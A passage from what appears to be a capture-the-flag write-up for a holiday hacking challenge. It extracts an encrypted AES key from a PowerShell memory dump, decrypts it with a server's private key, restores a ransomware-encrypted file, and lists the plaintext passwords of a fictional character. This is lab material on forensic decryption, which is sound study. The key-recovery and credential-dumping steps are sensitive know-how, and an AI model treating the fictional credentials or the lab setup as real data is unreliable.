+Clear-variable -Name &quot;Byte_key&quot;</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Download &apos;power_dump.py&apos;</p>
+<pre class="wp-block-code code-black-background"><code>root@kali:~/SANS# wget https://github.com/chrisjd20/power_dump/raw/master/power_dump.py
+--2019-01-03 19:13:16--  https://github.com/chrisjd20/power_dump/raw/master/power_dump.py
+Resolving github.com (github.com)... 192.30.255.113, 192.30.255.112
+Connecting to github.com (github.com)|192.30.255.113|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/chrisjd20/power_dump/master/power_dump.py [following]
+--2019-01-03 19:13:23--  https://raw.githubusercontent.com/chrisjd20/power_dump/master/power_dump.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16708 (16K) [text/plain]
+Saving to: &apos;power_dump.py&apos;
+
+power_dump.py                   100%[=======================================================&gt;]  16.32K  --.-KB/s    in 0.02s
+
+2019-01-03 19:13:24 (1007 KB/s) - &apos;power_dump.py&apos; saved [16708/16708]</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Run &apos;power_dump.py&apos; and load the PowerShell dump file &apos;powershell.exe_181109_104716.dmp&apos;</p>
+<pre class="wp-block-code code-black-background"><code>root@kali:~/SANS# python power_dump.py powershell.exe_181109_104716.dmp
+==============================
+ |  __ \
+ | |__) |____      _____ _ __
+ |  ___/ _ \ \ /\ / / _ \ &apos;__|
+ | |  | (_) \ V  V /  __/ |
+ |_|   \___/ \_/\_/ \___|_|
+ __                       __
+ \ \         (   )       / /
+  \ \_    (   ) (      _/ /
+   \__\    ) _   )    /__/
+    \\    ( \_     //
+     `\ _(_\ \)__ /&apos;
+     (____\___))
+  _____  _    _ __  __ _____
+ |  __ \| |  | |  \/  |  __ \
+ | |  | | |  | | \  / | |__) |
+ | |  | | |  | | |\/| |  ___/
+ | |__| | |__| | |  | | |
+ |_____/ \____/|_|  |_|_|
+Dumps PowerShell From Memory
+==============================
+=======================================
+1. Load PowerShell Memory Dump File
+2. Process PowerShell Memory Dump
+3. Search/Dump Powershell Scripts
+4. Search/Dump Stored PS Variables
+e. Exit
+: 1
+
+============ Load Dump Menu ================
+COMMAND |     ARGUMENT       | Explanation
+========|====================|==============
+ld      | /path/to/file.name | load mem dump
+ls      | ../directory/path  | list files
+B       |                    | back to menu
+============= Loaded File: =================
+
+============================================
+: ld powershell.exe_181109_104716.dmp
+
+============ Load Dump Menu ================
+COMMAND |     ARGUMENT       | Explanation
+========|====================|==============
+ld      | /path/to/file.name | load mem dump
+ls      | ../directory/path  | list files
+B       |                    | back to menu
+============= Loaded File: =================
+powershell.exe_181109_104716.dmp 427762187
+============================================
+: B</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Process the memory dump and search for 512 byte values in the dump</p>
+<pre class="wp-block-code code-black-background"><code>============ Main Menu ================
+Memory Dump: powershell.exe_181109_104716.dmp
+Loaded     : True
+Processed  : False
+=======================================
+1. Load PowerShell Memory Dump File
+2. Process PowerShell Memory Dump
+3. Search/Dump Powershell Scripts
+4. Search/Dump Stored PS Variables
+e. Exit
+: 2
+
+[i] Please wait, processing memory dump...
+[+] Found 65 script blocks!
+[+] Found some Powershell variable names to work with...
+[+] Found 10947 possible variables stored in memory
+Would you like to save this processed data for quick processing later &quot;Y&quot;es or &quot;N&quot;o?
+:
+Successfully Processed Memory Dump!
+
+Press Enter to Continue...
+
+
+============ Main Menu ================
+Memory Dump: powershell.exe_181109_104716.dmp
+Loaded     : True
+Processed  : True
+=======================================
+1. Load PowerShell Memory Dump File
+2. Process PowerShell Memory Dump
+3. Search/Dump Powershell Scripts
+4. Search/Dump Stored PS Variables
+e. Exit
+: len == 512
+
+================ Filters ================
+1| LENGTH  len(variable_values) == 512
+
+[i] 1 powershell Variable Values found!
+============== Search/Dump PS Variable Values ===================================
+COMMAND        |     ARGUMENT                | Explanation
+===============|=============================|=================================
+print          | print [all|num]             | print specific or all Variables
+dump           | dump [all|num]              | dump specific or all Variables
+contains       | contains [ascii_string]     | Variable Values must contain string
+matches        | matches &quot;[python_regex]&quot;    | match python regex inside quotes
+len            | len [&gt;|&lt;|&gt;=|&lt;=|==] [bt_size]| Variables length &gt;,&lt;,=,&gt;=,&lt;= size
+clear          | clear [all|num]             | clear all or specific filter num
+===============================================================================
+: print
+3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
+Variable Values #1 above ^
+Type any key to go back and just Enter to Continue...
+</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>PowerShell can work with PFX certificate files. Using the server.crt and
+  server.key files, a server.pfx file is easily created using the &apos;openssl&apos;
+  tool</p>
+<pre class="wp-block-code code-black-background"><code>root@kali:~/SANS# openssl pkcs12 -export -out server.pfx -inkey server.key -in server.crt -passout pass:topsecret
+root@kali:~/SANS# ls -al server.pfx
+-rw------- 1 root root 2469 Jan  3 20:54 server.pfx
+root@kali:~/SANS#</code></pre>
+<div style="height:20px" aria-hidden="true"
+class="wp-block-spacer"></div>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/server.pfx_.zip">server.pfx.zip</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/server.pfx_.zip" class="wp-block-file__button" download="">Download</a>
+</div>
+<p>Decrypt the encrypted key using the server.pfx file - The PowerShell script
+  below will decrypt the encrypted AES key from the dump file - the script
+  works on both Linux (using PowerShell Core 6 or later) and Windows 10 or
+  later.</p>
+<pre class="wp-block-code code-black-background"><code>function H2B {
+  param($HX)
+  $HX = $HX -split &apos;(..)&apos; | ? { $_ }
+  ForEach ($value in $HX){
+    [Convert]::ToInt32($value,16)
+  }
+}
+
+function B2H {
+  param($DEC)
+  $tmp = &apos;&apos;
+  ForEach ($value in $DEC){
+    $a = &quot;{0:x}&quot; -f [Int]$value
+    if ($a.length -eq 1){
+      $tmp += &apos;0&apos; + $a
+    } else {
+      $tmp += $a
+    }
+  }
+  return $tmp
+}
+
+function Private_Key_Dec($encrypted_string, [byte[]]$pub_bytes){
+  $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2(&apos;server.pfx&apos;, &apos;topsecret&apos;);
+  $decKey = $cert.PrivateKey.Decrypt($encrypted_string, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA1)
+  return $decKey
+}
+
+function decrypt_akey {
+  $encrypted = $( H2B &quot;3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971&quot;)
+  $akey = (Private_Key_Dec $encrypted)
+  Write-Host B2H($akey)
+}
+decrypt_akey</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/decrypt_aes_key.zip">decrypt_aes_key.zip</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/decrypt_aes_key.zip" class="wp-block-file__button" download="">Download</a>
+</div>
+<p>The decrypted 16 byte/128-bit AES key is:</p>
+<pre class="wp-block-code code-black-background"><code>251 207 193 33 145 93 153 204 32 163 211 213 216 79 131 8</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Now that the AES key has been recovered, the encrypted file &apos;alabaster_passwords_elfdb.wannacookie&apos;
+  can be decrypted by running the PowerShell script below - the script works
+  on both Linux (using PowerShell Core 6 or later) and Windows 10 or later.</p>
+<pre class="wp-block-code code-black-background"><code>function Decrypt_File($key, $File) {
+    [byte[]]$key = $key
+    $Suffix = &quot;`.wannacookie&quot;
+    [System.Int32]$KeySize = $key.Length*8
+    $AESP = New-Object &apos;System.Security.Cryptography.AesManaged&apos;
+    $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $AESP.BlockSize = 128
+    $AESP.KeySize = $KeySize
+    $AESP.Key = $key
+    $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open)
+    $DestFile = ($File -replace $Suffix)
+    $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create)
+    [Byte[]]$LenIV = New-Object Byte[] 4
+    $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
+    $FileSR.Read($LenIV,  0, 3) | Out-Null
+    [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)
+    [Byte[]]$IV = New-Object Byte[] $LIV
+    $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
+    $FileSR.Read($IV, 0, $LIV) | Out-Null
+    $AESP.IV = $IV
+    $Transform = $AESP.CreateDecryptor()
+    $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
+    [Int]$Count = 0
+    [Int]$BlockSzBts = $AESP.BlockSize / 8
+    [Byte[]]$Data = New-Object Byte[] $BlockSzBts
+    Do
+    {
+      $Count = $FileSR.Read($Data, 0, $BlockSzBts)
+      $CryptoS.Write($Data, 0, $Count)
+    }
+    While ($Count -gt 0)
+    $CryptoS.FlushFinalBlock()
+    $CryptoS.Close()
+    $FileSR.Close()
+    $FileSW.Close()
+}
+
+function H2B {
+  param($HX); $HX = $HX -split &apos;(..)&apos; | ? { $_ }; ForEach ($value in $HX){[Convert]::ToInt32($value,16)}
+}
+
+function Private_Key_Dec($encrypted_string, [byte[]]$pub_bytes){
+  $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2(&apos;server.pfx&apos;, &apos;topsecret&apos;);
+  $decKey = $cert.PrivateKey.Decrypt($encrypted_string, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA1)
+  return $decKey
+}
+
+function Decrypt ($filename) {
+  $encrypted = $( H2B &quot;3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971&quot;)
+  $akey = (Private_Key_Dec $encrypted)
+  (Decrypt_File $akey $filename)
+}
+Decrypt(&quot;alabaster_passwords.elfdb.wannacookie&quot;)</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/alabaster_passwords.elfdb_.zip">alabaster_passwords.elfdb.zip</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/alabaster_passwords.elfdb_.zip" class="wp-block-file__button" download="">Download</a>
+</div>
+<p>The decrypted file &apos;alabaster_passwords.elfdb&apos; is an SQLite3 database</p>
+<pre class="wp-block-code code-black-background"><code>root@kali:~/SANS# cat alabaster_passwords.elfdb
+wwII&#xFFFD;ZWW&#xFFFD;tablesqlitebrowser_rename_column_new_tablesqlitebrowser_rename_column_new_tableCREATE TABLE `sqlitebrowser_rename_column_new_table` (
+  `name`  TEXT NOT NULL,
+  `password`  TEXT NOT NULL,
+  `usedfor` TEXT NOT NULL
+)&#xFFFD;&#xFFFD;tablepasswordspasswordsCREATE TABLE `passwords` (
+  `name`  TEXT NOT NUL&#xFFFD;&#xFFFD;[tablepasswordspasswordsCREATE TABLE &quot;passwords&quot; (
+  `name`  TEXT NOT NULL,
+  `password`  TEXT NOT NULL,
+  `usedfor` TEXT NOT NULL
+1FC=+alabaster@kringlecastle.comKeepYourEnemiesClose1425www.toysrus.com51+-alabaster.snowballCookiesR0cK!2!#active directory&#xFFFD;1Calabaster@kringlecast&#xFFFD;61Calabaster.snowballED#ED#EED#EF#G#F#G#ABA#BA#Bvault&gt;  C/)alabaster@kringlecastle.comChristMasRox19283www.reddit.comC3&apos;alabaster@kringlecastle.comWoootz4Cookies19273www.4chan.org@C+1alabaster@kringlecastle.comYayImACoder1926www.codecademy.com?C7#alabaster@kringlecastle.comPetsEatCookiesTOo@813neopets.com--alabaster.snowball0912783162016123vault:17+alabaster.snowballMoarCookiesPreeze1928Barcode Scanner:C-#alabaster@kringlecastle.comCookiesRLyfe!*26netflix.comFC=+alabaster@kringlecastle.comKeepYourEnemiesClose1425www.toysrus.com51+-alabaster.snowballCookiesR0cK!2!#active directory</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The &apos;sqlite3&apos; tool displays the passwords and their use.</p>
+<pre class="wp-block-code code-black-background"><code>root@kali:~/SANS# sqlite3 alabaster_passwords.elfdb &apos;select password,usedfor from passwords&apos;
+CookiesR0cK!2!#|active directory
+KeepYourEnemiesClose1425|www.toysrus.com
+CookiesRLyfe!*26|netflix.com
+MoarCookiesPreeze1928|Barcode Scanner
+ED#ED#EED#EF#G#F#G#ABA#BA#B|vault
+PetsEatCookiesTOo@813|neopets.com
+YayImACoder1926|www.codecademy.com
+Woootz4Cookies19273|www.4chan.org
+ChristMasRox19283|www.reddit.com</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Alabaster&apos;s vault password is:
+  <br><strong>ED#ED#EED#EF#G#F#G#ABA#BA#B</strong>
+</p>
+</div></body></html>
